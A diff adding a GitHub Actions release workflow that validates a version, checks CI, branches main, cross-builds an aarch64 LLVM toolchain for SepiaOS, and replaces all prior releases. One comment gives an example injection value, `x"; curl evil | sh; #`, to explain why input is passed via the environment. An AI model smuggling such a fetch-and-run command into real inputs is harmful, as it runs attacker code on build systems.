@@ -1,0 +1,405 @@
+name: Release
+
+# Publishes the on-device LLVM toolchain. Manual on purpose: the version is a
+# human decision, so the person cutting the release types it in.
+#
+# main is branched into rel-<version> and the build runs on that branch, so the
+# released commit is a thing that still exists afterwards and main can move on
+# underneath it. The ref this workflow is dispatched on is therefore ignored:
+# the release always comes from main's head at the moment the gate runs.
+#
+# The gate that a `workflow_run` trigger would have given for free is enforced
+# explicitly instead: the `gate` job refuses to release a commit that CI has not
+# passed on.
+#
+# ONLY THE NEWEST RELEASE IS KEPT. Publishing deletes every release that came
+# before it, and their tags with them - the asset is ~60 MiB and this repository
+# ships one product, the current toolchain. The commits stay reachable through
+# their rel-<version> branches, which are never deleted, so an old release can
+# be rebuilt from source even though its tag is gone.
+#
+# Creating the branch is a push, so ci.yml runs on it as well. Here that is a
+# whole second cross-build of a commit CI has already passed on - the price of
+# "every branch is built" now that a build is hours rather than seconds. If it
+# ever needs to stop, the change is `branches-ignore: ['rel-*']` in ci.yml, not
+# shell logic here.
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version to release, e.g. 2026.09.01 or 1.0.0-rc1 (a leading "v" is added if missing)'
+        required: true
+        type: string
+      prerelease:
+        description: 'Mark as a pre-release, so it is not shown as Latest'
+        required: false
+        default: false
+        type: boolean
+
+# One release at a time. Not cancel-in-progress: a half-finished publish would
+# leave the old releases deleted and no new one in their place.
+concurrency:
+  group: release
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  # -------------------------------------------------------------------------
+  # Everything that can say "no" happens here, before a multi-hour build: the
+  # version is validated and the commit is checked against CI. Cheap, and it
+  # fails in seconds rather than after a full cross-build of LLVM.
+  #
+  # Unlike the sibling repositories this does *not* refuse a version that has
+  # already been released - re-releasing is a supported path here, because the
+  # publish step deletes what came before either way.
+  # -------------------------------------------------------------------------
+  gate:
+    name: check the version, then branch main
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: write
+    outputs:
+      tag: ${{ steps.version.outputs.tag }}
+      branch: ${{ steps.version.outputs.branch }}
+      sha: ${{ steps.main.outputs.sha }}
+      created: ${{ steps.branch.outputs.created }}
+    steps:
+      # `inputs.version` is attacker-controlled text. It is passed through the
+      # environment rather than interpolated into the script, because `${{ }}`
+      # is substituted before bash ever sees the line — a version of
+      # `x"; curl evil | sh; #` would otherwise run.
+      - name: Validate the version
+        id: version
+        env:
+          VERSION: ${{ inputs.version }}
+        run: |
+          # Trim the ends only. Deleting all whitespace would quietly turn a
+          # fat-fingered "1.0 0" into "1.00" and release the wrong version;
+          # internal whitespace has to reach the pattern below and be rejected.
+          version="$VERSION"
+          version="${version#"${version%%[![:space:]]*}"}"
+          version="${version%"${version##*[![:space:]]}"}"
+          version="${version#v}"
+          # Must start with a digit and stay inside what git accepts as a tag
+          # and what a filename can carry: no slashes, no shell metacharacters.
+          if [[ ! "$version" =~ ^[0-9][0-9A-Za-z.+-]*$ ]]; then
+            echo "::error title=Bad version::'${VERSION}' is not a version." \
+                 "Expected something like 2026.09.01, 1.0.0 or 1.0.0-rc1," \
+                 "optionally with a leading v."
+            exit 1
+          fi
+          {
+            echo "tag=v${version}"
+            echo "branch=rel-${version}"
+          } >> "$GITHUB_OUTPUT"
+          echo "Releasing v${version} from rel-${version}"
+
+      # Resolved once, here, and then used for everything downstream: the CI
+      # check, the branch, the release target and the commit named in the
+      # notes. Reading main's head again later would open a window where CI was
+      # checked on one commit and another was released.
+      - name: Resolve the head of main
+        id: main
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          sha="$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/main" --jq '.object.sha')"
+          [ -n "$sha" ] || { echo "::error::could not read the head of main"; exit 1; }
+          echo "sha=${sha}" >> "$GITHUB_OUTPUT"
+          echo "main is at ${sha}"
+
+      # A manual trigger cannot inherit "CI passed on this commit" the way an
+      # automatic one would, so it is asked for outright - and asked about the
+      # commit being released, which is main's head rather than whatever ref
+      # this workflow happened to be dispatched on.
+      - name: Require a green CI run for that commit
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SHA: ${{ steps.main.outputs.sha }}
+        run: |
+          runs="$(gh api \
+            "repos/${GITHUB_REPOSITORY}/actions/workflows/ci.yml/runs?head_sha=${SHA}&status=success" \
+            --jq '.total_count' 2>/dev/null || echo 0)"
+          if [ "${runs:-0}" -eq 0 ]; then
+            echo "::error title=No green CI run::main (${SHA}) has no successful" \
+                 "CI run. Push it, wait for CI, then release — or re-run CI on it."
+            exit 1
+          fi
+          echo "CI passed on ${SHA} (${runs} successful run(s))"
+
+      # Created before the build rather than after it, because the build has to
+      # run *on* the release branch - that is what makes the released commit
+      # something that still exists whatever main does next, and what keeps an
+      # old release's commit reachable after its tag has been deleted.
+      #
+      # A branch left behind by a failed attempt at this same version is moved
+      # rather than treated as an error, so a retry does not need a hand-cleaned
+      # repository. `created` records which of the two happened, so the rollback
+      # below only deletes a branch this run made.
+      - name: Branch main into the release branch
+        id: branch
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BRANCH: ${{ steps.version.outputs.branch }}
+          SHA: ${{ steps.main.outputs.sha }}
+        run: |
+          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${BRANCH}" >/dev/null 2>&1; then
+            gh api --method PATCH "repos/${GITHUB_REPOSITORY}/git/refs/heads/${BRANCH}" \
+              -F force=true -f "sha=${SHA}" >/dev/null
+            echo "created=false" >> "$GITHUB_OUTPUT"
+            echo "::notice title=Reused ${BRANCH}::The branch already existed and" \
+                 "was moved to main's head (${SHA})."
+          else
+            gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" \
+              -f "ref=refs/heads/${BRANCH}" -f "sha=${SHA}" >/dev/null
+            echo "created=true" >> "$GITHUB_OUTPUT"
+            echo "Branched main (${SHA}) into ${BRANCH}"
+          fi
+
+  # -------------------------------------------------------------------------
+  # The cross-build, in the same container CI verified in - and on Linux
+  # because the toolchain vendor, and therefore the binaries, differ by build
+  # host. Hours, not minutes.
+  # -------------------------------------------------------------------------
+  build:
+    name: cross-build and pack
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    container: debian:trixie-slim
+    outputs:
+      asset: ${{ steps.identity.outputs.asset }}
+      llvm: ${{ steps.identity.outputs.llvm }}
+      musl: ${{ steps.identity.outputs.musl }}
+      triple: ${{ steps.identity.outputs.triple }}
+      toolchain: ${{ steps.identity.outputs.toolchain }}
+    steps:
+      # Before checkout on purpose: without git in the container,
+      # actions/checkout silently falls back to downloading a tarball.
+      - name: Install build tools
+        run: |
+          apt-get update -qq
+          apt-get install -y -qq --no-install-recommends \
+            make cmake ninja-build python3 git curl ca-certificates xz-utils
+
+      # The release branch, not the dispatched ref: this is the whole point of
+      # having branched.
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ needs.gate.outputs.branch }}
+
+      # Everything the release notes say about the product is read out of the
+      # Makefile rather than written twice. print-% and these variable names
+      # are a CI contract.
+      - name: Read what is being released
+        id: identity
+        env:
+          TAG: ${{ needs.gate.outputs.tag }}
+        run: |
+          {
+            echo "asset=$(make -s DIST_TAG="$TAG" print-DIST_ASSET)"
+            echo "llvm=$(make -s print-LLVM_VERSION)"
+            echo "musl=$(make -s print-MUSL_VERSION)"
+            echo "triple=$(make -s print-LLVM_TRIPLE)"
+            echo "toolchain=$(make -s print-TC_VENDOR) $(make -s print-TC_VERSION)"
+          } >> "$GITHUB_OUTPUT"
+
+      # One goal: stage pulls in the toolchain, the sources, the sysroot, the
+      # host tablegen tools and the cross-build behind it.
+      - name: Build and stage the toolchain
+        run: make stage
+
+      # Nothing ships until the staged tree has been read back: aarch64, on the
+      # musl loader, with a complete shared-library closure.
+      - name: Verify the staged tree
+        run: make stage-check
+
+      # `dist` asserts that no libc or loader is in the tree before packing -
+      # what ships is LLVM, and the device's musl comes from rootfs.
+      - name: Pack the release asset
+        env:
+          TAG: ${{ needs.gate.outputs.tag }}
+        run: |
+          make DIST_TAG="$TAG" dist
+          make DIST_TAG="$TAG" dist-info
+
+      # compression-level 0: the payload is already xz -9, so zipping it again
+      # only burns CPU.
+      - uses: actions/upload-artifact@v5
+        with:
+          name: release-assets
+          path: dist/
+          compression-level: 0
+          if-no-files-found: error
+
+      - name: Upload the build logs
+        if: failure()
+        uses: actions/upload-artifact@v5
+        with:
+          name: build-logs
+          path: |
+            build/*.log
+            build/host/build.log
+            build/target/build.log
+            build/musl/*/build.log
+          if-no-files-found: ignore
+
+  # -------------------------------------------------------------------------
+  # Publishing is a separate job purely so it can run on the bare runner, where
+  # `gh` is preinstalled. Debian does not package the GitHub CLI, so doing this
+  # in the build container would mean either a third-party action or hand-rolled
+  # REST calls.
+  #
+  # Deleting the old releases happens here rather than in the gate, deliberately
+  # late: nothing is destroyed until there is a built asset to put in its place.
+  #
+  # `gh release create --target` creates the tag as part of the release, so the
+  # "tag exists but the release does not" half-state cannot happen.
+  # -------------------------------------------------------------------------
+  publish:
+    name: replace the release
+    needs: [gate, build]
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/download-artifact@v5
+        with:
+          name: release-assets
+          path: dist
+
+      # Every release, not just the one whose tag collides: this repository
+      # publishes one product and keeps the current one only. --cleanup-tag
+      # takes the tag with it, which is safe because each released commit is
+      # also the head of a rel-<version> branch and stays reachable that way.
+      #
+      # A deletion that fails is fatal rather than a warning. Carrying on would
+      # publish while leaving behind exactly what this step exists to remove,
+      # and if the leftover is the tag being released, the create below fails
+      # anyway - with a far less obvious message.
+      - name: Delete the previous releases
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.gate.outputs.tag }}
+        run: |
+          mapfile -t tags < <(gh release list --repo "$GITHUB_REPOSITORY" \
+            --limit 200 --json tagName --jq '.[].tagName')
+          if [ "${#tags[@]}" -eq 0 ]; then
+            echo "No previous releases to delete."
+          else
+            echo "::warning title=Deleting ${#tags[@]} previous release(s)::${tags[*]}"
+            for t in "${tags[@]}"; do
+              gh release delete "$t" --repo "$GITHUB_REPOSITORY" --yes --cleanup-tag \
+                || { echo "::error title=Could not delete ${t}::The release or its" \
+                          "tag could not be removed; nothing has been published."; exit 1; }
+              echo "deleted ${t}"
+            done
+          fi
+          # A tag with no release behind it is invisible to the sweep above and
+          # would still collide with the create below.
+          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${TAG}" >/dev/null 2>&1; then
+            gh api --method DELETE "repos/${GITHUB_REPOSITORY}/git/refs/tags/${TAG}" \
+              || { echo "::error title=${TAG} already tagged::The tag exists without" \
+                        "a release and could not be deleted."; exit 1; }
+            echo "deleted the dangling tag ${TAG}"
+          fi
+
+      - name: Create the release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.gate.outputs.tag }}
+          BRANCH: ${{ needs.gate.outputs.branch }}
+          SHA: ${{ needs.gate.outputs.sha }}
+          ASSET: ${{ needs.build.outputs.asset }}
+          LLVM: ${{ needs.build.outputs.llvm }}
+          MUSL: ${{ needs.build.outputs.musl }}
+          TRIPLE: ${{ needs.build.outputs.triple }}
+          TOOLCHAIN: ${{ needs.build.outputs.toolchain }}
+          PRERELEASE: ${{ inputs.prerelease }}
+        run: |
+          cat > notes.md <<EOF
+          LLVM for SepiaOS: aarch64 \`clang\` and \`lld\`, cross-built against musl
+          to run **on** the Raspberry Pi, so a SepiaOS device compiles for itself.
+          This is not a cross-compiler for a development host.
+
+          | | |
+          |---|---|
+          | LLVM | \`${LLVM}\` |
+          | Target triple | \`${TRIPLE}\` |
+          | Built against musl | \`${MUSL}\` |
+          | Cross-toolchain | \`${TOOLCHAIN}\` |
+          | Commit | \`${SHA}\` |
+          | Branch | \`${BRANCH}\` |
+
+          The asset is a \`usr/\` tree: \`clang\`, \`lld\` and the LLVM binutils
+          equivalents in \`usr/bin\`, the LLVM and clang shared libraries plus
+          \`libstdc++.so.6\` and \`libgcc_s.so.1\` in \`usr/lib\`, and clang's own
+          builtin headers under \`usr/lib/clang/\`. \`rootfs\` unpacks it into the
+          root filesystem.
+
+          \`\`\`sh
+          sha256sum -c SHA256SUMS
+          tar -C / -xf ${ASSET}
+          \`\`\`
+
+          **musl is not in here.** The tools are dynamically linked and run
+          against the libc \`rootfs\` puts on the card — musl \`${MUSL}\` — so a
+          second copy would only be two libcs disagreeing with each other. The
+          two C++ runtime libraries are included because nothing else on the
+          device provides them and \`clang\` cannot start without them.
+
+          Only the newest release is kept: publishing this one deleted the
+          releases before it. The commit each was built from is still reachable
+          through its \`rel-<version>\` branch.
+          EOF
+
+          if [ "$PRERELEASE" = "true" ]; then
+            flag=(--prerelease)
+          else
+            flag=(--latest)
+          fi
+
+          gh release create "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            --target "$BRANCH" \
+            --title "SepiaOS LLVM $TAG (llvm $LLVM)" \
+            --notes-file notes.md \
+            "${flag[@]}" \
+            "dist/$ASSET" \
+            dist/SHA256SUMS
+
+  # -------------------------------------------------------------------------
+  # The branch is created before the build, so a build that fails leaves one
+  # behind. It holds nothing main does not - it was created seconds earlier as a
+  # pointer to main's head, and nothing commits to it - so it is removed again
+  # and the same version can be released once whatever failed is fixed.
+  #
+  # Only a branch this run created is deleted: one that was already there
+  # belongs to an earlier attempt and was moved, not made, and deleting it would
+  # be destroying something this run did not create. Nothing is published on
+  # this path, so no release has been deleted either.
+  # -------------------------------------------------------------------------
+  rollback:
+    name: remove the release branch again
+    needs: [gate, build]
+    if: failure() && needs.gate.result == 'success' && needs.gate.outputs.created == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: write
+    steps:
+      - name: Delete the release branch
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BRANCH: ${{ needs.gate.outputs.branch }}
+        run: |
+          if gh api --method DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/${BRANCH}"; then
+            echo "::notice title=Rolled back::${BRANCH} was deleted; the release can be retried."
+          else
+            echo "::warning title=Branch left behind::${BRANCH} could not be deleted." \
+                 "Delete it by hand before retrying this version."
+          fi
